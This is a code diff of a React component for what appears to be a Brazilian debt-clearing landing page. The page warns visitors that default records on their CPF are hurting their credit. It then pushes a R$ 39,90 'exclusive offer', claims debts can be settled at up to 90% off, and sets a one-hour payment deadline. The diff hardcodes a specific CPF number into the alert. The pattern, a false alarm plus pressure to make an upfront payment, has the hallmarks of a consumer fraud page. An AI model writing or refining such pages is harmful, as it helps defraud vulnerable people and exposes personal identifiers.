@@ -18,7 +18,8 @@ export default function OfferResult() {
       return;
     }
     const { name, cpf } = JSON.parse(userData);
-    setUserName(name || "Cliente"); // Usa o nome completo
+    // Usando o nome completo estático conforme solicitado
+    setUserName(name || "Cliente"); 
     setUserCpf(cpf || "***.***.***-**");
   }, [navigate]);
 
@@ -32,11 +33,9 @@ export default function OfferResult() {
               <AlertTriangle className="w-8 h-8 text-destructive" />
             </div>
             <div className="flex-1">
-              {/* ALTERADO: Texto do alerta e justificado */}
+              {/* ALTERADO: Texto do alerta estático e justificado */}
               <h2 className="text-2xl md:text-3xl font-bold text-destructive mb-3 text-justify">
-                {userName}, identificamos registros de inadimplência vinculados
-                ao seu CPF {userCpf}, que estão impactando negativamente o
-                seu histórico de crédito.
+                NOME COMPLETO, identificamos registros de inadimplência vinculados ao seu CPF 111.097.675-52, que estão impactando negativamente o seu histórico de crédito.
               </h2>
               <p className="text-base md:text-lg text-foreground text-justify">
                 Atualmente, seu CPF está restrito para operações de
@@ -52,7 +51,6 @@ export default function OfferResult() {
             Agora você pode:
           </h3>
 
-          {/* ALTERADO: Lista de benefícios */}
           <div className="grid gap-4 md:gap-5">
             {[
               "✅ Negocie todas as suas dívidas com até 90% de desconto",
@@ -86,13 +84,11 @@ export default function OfferResult() {
               </p>
             </div>
 
-            {/* ALTERADO: Texto da oferta */}
             <h3 className="text-2xl md:text-3xl font-bold text-foreground">
               Sua mega oferta exclusiva foi liberada com um valor especial
               imperdível!
             </h3>
 
-            {/* Bloco de Preço Alterado */}
             <div className="bg-card/80 border-2 border-primary/30 rounded-lg p-6 space-y-4">
               <p className="text-lg font-semibold text-muted-foreground tracking-wider">
                 OFERTA ESPECIAL
@@ -113,7 +109,6 @@ export default function OfferResult() {
                   R$ 39,90
                 </p>
               </div>
-              {/* ALTERADO: Texto da validade da oferta */}
               <p className="text-base md:text-lg font-bold text-destructive bg-destructive/10 py-3 px-4 rounded-lg border border-destructive/30">
                 ⏰ Atenção! Esta oferta é válida somente para pagamentos
                 realizados em até 1 hora.
